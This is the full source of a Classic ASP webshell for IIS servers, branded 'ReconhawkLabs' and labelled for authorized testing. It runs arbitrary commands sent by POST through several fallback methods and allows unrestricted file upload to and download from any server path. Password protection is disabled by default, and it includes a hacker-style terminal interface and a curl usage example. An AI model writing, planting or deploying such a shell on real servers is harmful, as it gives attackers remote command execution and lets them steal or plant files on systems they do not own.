<%@ Language=VBScript %>
<%
'**************************************************
' Classic ASP Webshell - For Legacy IIS Servers
' For authorized security testing only
' Features: Multiple execution methods, file operations
' Note: Classic ASP is more limited than ASPX
'**************************************************

Option Explicit
Response.Buffer = True

' Configuration
Const AUTH_ENABLED = False
Const AUTH_PASSWORD = "changeme"

' Authentication check
If AUTH_ENABLED Then
    If Request.Form("password") <> AUTH_PASSWORD Then
        If Request.ServerVariables("REQUEST_METHOD") = "POST" Then
            Response.Status = "401 Unauthorized"
            Response.ContentType = "application/json"
            Response.Write "{""error"":""Authentication failed""}"
            Response.End
        End If
    End If
End If

' Handle file download
If Request.QueryString("download") <> "" Then
    HandleDownload()
End If

' Handle file upload
If Request.ServerVariables("REQUEST_METHOD") = "POST" And Request.QueryString("action") = "upload" Then
    HandleUpload()
End If

' Handle command execution (API mode)
If Request.ServerVariables("REQUEST_METHOD") = "POST" And Request.Form("cmd") <> "" Then
    HandleCommandAPI()
End If

' ======= Functions =======

Function ExecuteCommand(cmd)
    Dim output, method, result
    output = ""
    method = "none"

    ' Method 1: WScript.Shell (most common)
    On Error Resume Next
    Dim wsh, exec
    Set wsh = Server.CreateObject("WScript.Shell")
    If Err.Number = 0 Then
        Set exec = wsh.Exec("cmd.exe /c " & cmd & " 2>&1")
        If Err.Number = 0 Then
            Do While Not exec.StdOut.AtEndOfStream
                output = output & exec.StdOut.ReadLine() & vbCrLf
            Loop
            If output <> "" Then
                method = "WScript.Shell/Exec"
                Set ExecuteCommand = CreateDict(output, method)
                Exit Function
            End If
        End If

        ' Fallback to Run method with temp file
        Dim tempFile, fso
        tempFile = Server.MapPath(".") & "\tmp_" & Timer() & ".txt"
        wsh.Run "cmd.exe /c " & cmd & " > " & tempFile & " 2>&1", 0, True
        If Err.Number = 0 Then
            Set fso = Server.CreateObject("Scripting.FileSystemObject")
            If fso.FileExists(tempFile) Then
                Dim ts
                Set ts = fso.OpenTextFile(tempFile, 1)
                output = ts.ReadAll()
                ts.Close
                fso.DeleteFile tempFile
                If output <> "" Then
                    method = "WScript.Shell/Run+TempFile"
                    Set ExecuteCommand = CreateDict(output, method)
                    Exit Function
                End If
            End If
        End If
    End If

    ' Method 2: Shell.Application (alternative)
    On Error Resume Next
    Dim shell
    Set shell = Server.CreateObject("Shell.Application")
    If Err.Number = 0 Then
        Dim tempFile2
        tempFile2 = Server.MapPath(".") & "\tmp2_" & Timer() & ".txt"
        shell.ShellExecute "cmd.exe", "/c " & cmd & " > " & tempFile2 & " 2>&1", "", "", 0
        If Err.Number = 0 Then
            WScript.Sleep 2000 ' Wait for command to complete
            Set fso = Server.CreateObject("Scripting.FileSystemObject")
            If fso.FileExists(tempFile2) Then
                Set ts = fso.OpenTextFile(tempFile2, 1)
                output = ts.ReadAll()
                ts.Close
                fso.DeleteFile tempFile2
                If output <> "" Then
                    method = "Shell.Application"
                    Set ExecuteCommand = CreateDict(output, method)
                    Exit Function
                End If
            End If
        End If
    End If

    ' Method 3: ADODB.Stream with command output (creative approach)
    On Error Resume Next
    Set wsh = Server.CreateObject("WScript.Shell")
    If Err.Number = 0 Then
        Dim tempFile3
        tempFile3 = Server.MapPath(".") & "\tmp3_" & Timer() & ".txt"
        wsh.Run "cmd.exe /c " & cmd & " > """ & tempFile3 & """ 2>&1", 0, True

        Set fso = Server.CreateObject("Scripting.FileSystemObject")
        If fso.FileExists(tempFile3) Then
            Dim stream
            Set stream = Server.CreateObject("ADODB.Stream")
            stream.Type = 2 ' Text
            stream.Charset = "iso-8859-1"
            stream.Open
            stream.LoadFromFile tempFile3
            output = stream.ReadText()
            stream.Close
            fso.DeleteFile tempFile3
            If output <> "" Then
                method = "WScript.Shell+ADODB.Stream"
                Set ExecuteCommand = CreateDict(output, method)
                Exit Function
            End If
        End If
    End If

    output = "All execution methods failed or are disabled"
    Set ExecuteCommand = CreateDict(output, method)
End Function

Function CreateDict(output, method)
    Dim dict
    Set dict = Server.CreateObject("Scripting.Dictionary")
    dict.Add "output", output
    dict.Add "method", method
    Set CreateDict = dict
End Function

Sub HandleCommandAPI()
    Dim cmd, result
    cmd = Request.Form("cmd")
    Set result = ExecuteCommand(cmd)

    Response.ContentType = "application/json"
    Response.Write "{""command"":""" & JSEscape(cmd) & ""","
    Response.Write """output"":""" & JSEscape(result("output")) & ""","
    Response.Write """method"":""" & result("method") & ""","
    Response.Write """cwd"":""" & JSEscape(Server.MapPath(".")) & ""","
    Response.Write """timestamp"":""" & Now() & """}"
    Response.End
End Sub

Sub HandleDownload()
    Dim filePath, fso, ts, content
    filePath = Request.QueryString("download")

    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(filePath) Then
        Response.ContentType = "application/octet-stream"
        Response.AddHeader "Content-Disposition", "attachment; filename=""" & fso.GetFileName(filePath) & """"

        ' For binary files, use ADODB.Stream
        On Error Resume Next
        Dim stream
        Set stream = Server.CreateObject("ADODB.Stream")
        stream.Type = 1 ' Binary
        stream.Open
        stream.LoadFromFile filePath
        Response.BinaryWrite stream.Read()
        stream.Close

        If Err.Number <> 0 Then
            ' Fallback to text mode
            Set ts = fso.OpenTextFile(filePath, 1)
            Response.Write ts.ReadAll()
            ts.Close
        End If
    Else
        Response.Write "File not found or not readable"
    End If
    Response.End
End Sub

Sub HandleUpload()
    Dim uploadDir, byteCount, strItem, errorDetails, uploadSuccess, methodUsed, targetFile
    uploadDir = Request.Form("upload_dir")
    If uploadDir = "" Then uploadDir = Server.MapPath(".")

    errorDetails = ""
    uploadSuccess = False
    methodUsed = ""

    On Error Resume Next

    ' Classic ASP file upload requires parsing the binary data
    ' Method 1: Using ADODB.Stream (most reliable for Classic ASP)
    byteCount = Request.TotalBytes
    If byteCount > 0 Then
        Dim binData, fso, stream, boundary, fileName, fileData
        binData = Request.BinaryRead(byteCount)

        ' Parse multipart form data
        boundary = GetBoundary()
        fileName = GetFileName(binData, boundary)

        If fileName <> "" Then
            targetFile = uploadDir & "\" & fileName

            Set fso = Server.CreateObject("Scripting.FileSystemObject")

            ' Ensure directory exists
            If Not fso.FolderExists(uploadDir) Then
                fso.CreateFolder uploadDir
            End If

            ' Extract file data from multipart
            fileData = ExtractFileData(binData, boundary)

            ' Method 1: ADODB.Stream
            Set stream = Server.CreateObject("ADODB.Stream")
            stream.Type = 1 ' Binary
            stream.Open
            stream.Write fileData
            stream.SaveToFile targetFile, 2 ' Overwrite
            stream.Close

            If Err.Number = 0 And fso.FileExists(targetFile) Then
                uploadSuccess = True
                methodUsed = "ADODB.Stream"
            Else
                errorDetails = "ADODB.Stream failed: " & Err.Description
            End If

            ' Method 2: Scripting.FileSystemObject with CreateTextFile (text files only)
            If Not uploadSuccess Then
                Err.Clear
                Dim ts
                Set ts = fso.CreateTextFile(targetFile, True)
                ts.Write BinaryToString(fileData)
                ts.Close

                If Err.Number = 0 And fso.FileExists(targetFile) Then
                    uploadSuccess = True
                    methodUsed = "FSO/CreateTextFile"
                Else
                    errorDetails = errorDetails & "; FSO failed: " & Err.Description
                End If
            End If

            Response.ContentType = "application/json"
            If uploadSuccess Then
                Dim fileSize
                fileSize = fso.GetFile(targetFile).Size
                Response.Write "{""success"":true,""message"":""File uploaded successfully"","
                Response.Write """path"":""" & JSEscape(targetFile) & ""","
                Response.Write """method"":""" & methodUsed & ""","
                Response.Write """size"":" & fileSize & "}"
            Else
                Response.Write "{""success"":false,""message"":""Upload failed"","
                Response.Write """errors"":[""" & JSEscape(errorDetails) & """]}"
            End If
        Else
            Response.ContentType = "application/json"
            Response.Write "{""success"":false,""message"":""Could not parse filename""}"
        End If
    Else
        Response.ContentType = "application/json"
        Response.Write "{""success"":false,""message"":""No data received""}"
    End If
    Response.End
End Sub

Function GetBoundary()
    Dim contentType, parts
    contentType = Request.ServerVariables("CONTENT_TYPE")
    If InStr(contentType, "boundary=") > 0 Then
        parts = Split(contentType, "boundary=")
        GetBoundary = "--" & parts(1)
    Else
        GetBoundary = ""
    End If
End Function

Function GetFileName(binData, boundary)
    Dim strData, pos1, pos2, contentDisp
    strData = BinaryToString(binData)

    pos1 = InStr(strData, "Content-Disposition:")
    If pos1 > 0 Then
        pos2 = InStr(pos1, strData, vbCrLf)
        contentDisp = Mid(strData, pos1, pos2 - pos1)

        If InStr(contentDisp, "filename=""") > 0 Then
            pos1 = InStr(contentDisp, "filename=""") + 10
            pos2 = InStr(pos1, contentDisp, """")
            GetFileName = Mid(contentDisp, pos1, pos2 - pos1)
            ' Extract just the filename without path
            If InStr(GetFileName, "\") > 0 Then
                GetFileName = Mid(GetFileName, InStrRev(GetFileName, "\") + 1)
            End If
        End If
    End If
End Function

Function ExtractFileData(binData, boundary)
    ' This is a simplified extraction - in production, you'd want more robust parsing
    Dim strData, startMarker, endMarker, dataStart, dataEnd
    strData = BinaryToString(binData)

    startMarker = vbCrLf & vbCrLf
    dataStart = InStr(strData, startMarker)

    If dataStart > 0 Then
        dataStart = dataStart + Len(startMarker)
        endMarker = vbCrLf & boundary
        dataEnd = InStr(dataStart, strData, endMarker)

        If dataEnd > dataStart Then
            ExtractFileData = MidB(binData, dataStart, dataEnd - dataStart)
            Exit Function
        End If
    End If

    ExtractFileData = binData
End Function

Function BinaryToString(binData)
    Dim stream
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write binData
    stream.Position = 0
    stream.Type = 2 ' Text
    stream.Charset = "iso-8859-1"
    BinaryToString = stream.ReadText()
    stream.Close
End Function

Function JSEscape(str)
    JSEscape = Replace(Replace(Replace(str, "\", "\\"), """", "\"""), vbCrLf, "\n")
    JSEscape = Replace(JSEscape, vbCr, "\n")
    JSEscape = Replace(JSEscape, vbLf, "\n")
End Function

Function GetSystemInfo()
    Dim dict
    Set dict = Server.CreateObject("Scripting.Dictionary")

    On Error Resume Next
    dict.Add "hostname", Request.ServerVariables("SERVER_NAME")
    dict.Add "server_software", Request.ServerVariables("SERVER_SOFTWARE")
    dict.Add "asp_version", ScriptEngine & " " & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion
    dict.Add "current_user", CreateObject("WScript.Network").UserName
    dict.Add "cwd", Server.MapPath(".")
    dict.Add "app_path", Request.ServerVariables("APPL_PHYSICAL_PATH")

    Set GetSystemInfo = dict
End Function

' ======= Render UI =======
Dim sysinfo
Set sysinfo = GetSystemInfo()
%>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReconhawkLabs ASP Shell</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 10px; font-size: 13px; }
        .container { max-width: 1600px; margin: 0 auto; }
        h1 { color: #00ff00; margin-bottom: 8px; font-size: 18px; letter-spacing: 1px; }
        .info-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 10px; padding: 8px; background: #000; border: 1px solid #00ff00; font-size: 11px; }
        .info-item { display: flex; gap: 10px; }
        .info-label { color: #ffffff; font-weight: bold; }
        .terminal-section { margin-bottom: 10px; }
        .section-title { color: #ffffff; margin-bottom: 5px; font-size: 14px; text-transform: uppercase; }
        .terminal { background: #000; border: 1px solid #00ff00; padding: 10px; height: 250px; overflow-y: auto; margin-bottom: 5px; font-size: 12px; }
        .terminal-output { white-space: pre-wrap; word-wrap: break-word; margin-bottom: 5px; }
        .command-line { color: #ffaa00; }
        .method-info { color: #888; font-size: 0.85em; }
        .input-group { display: flex; gap: 5px; margin-bottom: 10px; }
        input[type="text"] { flex: 1; background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 6px 10px; font-family: 'Courier New', monospace; font-size: 13px; }
        button { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 6px 15px; font-family: 'Courier New', monospace; font-weight: bold; cursor: pointer; font-size: 13px; }
        button:hover { background: #00ff00; color: #000; }
        .file-operations { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-top: 10px; }
        .file-op-box { background: #000; border: 1px solid #00ff00; padding: 10px; }
        input[type="file"] { display: block; margin: 5px 0; color: #00ff00; font-size: 12px; }
        .status-message { padding: 5px; margin: 5px 0; display: none; font-size: 12px; }
        .status-success { background: #000; border: 1px solid #00ff00; color: #00ff00; }
        .status-error { background: #000; border: 1px solid #ff0000; color: #ff0000; }
        .api-example { background: #000; padding: 5px; margin: 5px 0; overflow-x: auto; border-left: 2px solid #00ff00; padding-left: 10px; }
        .api-example code { color: #ffaa00; font-size: 11px; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #00ff00; }
    </style>
</head>
<body>
    <div class="container">
        <h1>[ ReconhawkLabs ] - Classic ASP Shell</h1>

        <div class="info-grid">
            <div class="info-item"><span class="info-label">Hostname:</span><span><%= Server.HTMLEncode(sysinfo("hostname")) %></span></div>
            <div class="info-item"><span class="info-label">Server:</span><span><%= Server.HTMLEncode(sysinfo("server_software")) %></span></div>
            <div class="info-item"><span class="info-label">ASP:</span><span><%= Server.HTMLEncode(sysinfo("asp_version")) %></span></div>
            <div class="info-item"><span class="info-label">User:</span><span><%= Server.HTMLEncode(sysinfo("current_user")) %></span></div>
            <div class="info-item"><span class="info-label">CWD:</span><span><%= Server.HTMLEncode(sysinfo("cwd")) %></span></div>
            <div class="info-item"><span class="info-label">Status:</span><span style="color: #00ff00;">Active</span></div>
        </div>

        <div class="terminal-section">
            <h2 class="section-title">[ Command Terminal ]</h2>
            <div id="terminal" class="terminal"></div>
            <div class="input-group">
                <input type="text" id="cmdInput" placeholder="Enter command..." autofocus>
                <button onclick="executeCmd()">Execute</button>
                <button onclick="clearTerminal()">Clear</button>
            </div>
        </div>

        <div class="file-operations">
            <div class="file-op-box">
                <h2 class="section-title">[ Upload File ]</h2>
                <form id="uploadForm" method="post" action="?action=upload" enctype="multipart/form-data">
                    <input type="file" name="upload_file" id="uploadFile" required>
                    <input type="text" name="upload_dir" placeholder="Upload directory (default: current)" style="width: 100%; margin: 5px 0;">
                    <button type="submit">Upload</button>
                </form>
                <div id="uploadStatus" class="status-message"></div>
            </div>

            <div class="file-op-box">
                <h2 class="section-title">[ Download File ]</h2>
                <input type="text" id="downloadPath" placeholder="Enter file path..." style="width: 100%; margin: 5px 0;">
                <button onclick="downloadFile()">Download</button>
            </div>

            <div class="file-op-box">
                <h2 class="section-title">[ API Documentation ]</h2>
                <p>POST command:</p>
                <div class="api-example"><code>curl -X POST [URL] -d "cmd=whoami"</code></div>
                <p style="margin-top: 5px;">Returns: JSON (output, method, cwd, timestamp)</p>
            </div>
        </div>
    </div>

    <script>
        const terminal = document.getElementById('terminal');
        const cmdInput = document.getElementById('cmdInput');
        let commandHistory = [];
        let historyIndex = -1;

        cmdInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                executeCmd();
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    cmdInput.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    cmdInput.value = commandHistory[historyIndex];
                } else if (historyIndex === 0) {
                    historyIndex = -1;
                    cmdInput.value = '';
                }
            }
        });

        async function executeCmd() {
            const cmd = cmdInput.value.trim();
            if (!cmd) return;

            commandHistory.unshift(cmd);
            historyIndex = -1;

            const cmdLine = document.createElement('div');
            cmdLine.className = 'command-line';
            cmdLine.textContent = '> ' + cmd;
            terminal.appendChild(cmdLine);

            cmdInput.value = '';

            try {
                const formData = new FormData();
                formData.append('cmd', cmd);

                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();

                const output = document.createElement('div');
                output.className = 'terminal-output';
                output.textContent = result.output || '(no output)';
                terminal.appendChild(output);

                const methodInfo = document.createElement('div');
                methodInfo.className = 'method-info';
                methodInfo.textContent = `[Method: ${result.method}] [CWD: ${result.cwd}]`;
                terminal.appendChild(methodInfo);

            } catch (error) {
                const errorDiv = document.createElement('div');
                errorDiv.style.color = '#ff0000';
                errorDiv.textContent = 'Error: ' + error.message;
                terminal.appendChild(errorDiv);
            }

            terminal.scrollTop = terminal.scrollHeight;
        }

        function clearTerminal() {
            terminal.innerHTML = '';
        }

        function downloadFile() {
            const path = document.getElementById('downloadPath').value.trim();
            if (!path) {
                alert('Please enter a file path');
                return;
            }
            window.location.href = window.location.pathname + '?download=' + encodeURIComponent(path);
        }

        cmdInput.focus();
    </script>
</body>
</html>
